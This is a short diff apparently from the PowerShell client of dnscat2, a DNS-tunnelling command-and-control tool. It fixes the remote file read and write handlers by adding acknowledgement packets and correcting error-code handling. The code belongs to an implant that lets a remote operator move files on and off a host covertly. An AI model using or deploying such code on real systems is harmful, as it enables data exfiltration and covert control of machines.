@@ -1715,8 +1715,10 @@ function Update-Dnscat2CommandSession ($Session) {
                         $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)                    
                         $Session["DriverDataQueue"] += $DriverData
                     }
+                    $DriverData = ("00000004" + $Session.PacketIdBF + $Session["CommandId"])
+                    $Session["DriverDataQueue"] += $DriverData
                 } catch {
-                    $ErrorCode = $CommandId
+                    $ErrorCode = $Session["CommandId"]
                     $Reason = (Convert-StringToHex "Could not read file. Make sure to provide the full path!") + "00"
                     $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
@@ -1738,8 +1740,10 @@ function Update-Dnscat2CommandSession ($Session) {
                         [byte[]]$Bytes = Convert-HexToBytes $Data
                         [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                     }
+                    $DriverData = ("00000004" + $Session.PacketIdBF + $Session["CommandId"])
+                    $Session["DriverDataQueue"] += $DriverData
                 } catch {
-                    $ErrorCode = $CommandId
+                    $ErrorCode = $Session["CommandId"]
                     $Reason = (Convert-StringToHex "Could not write file") + "00"
                     $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
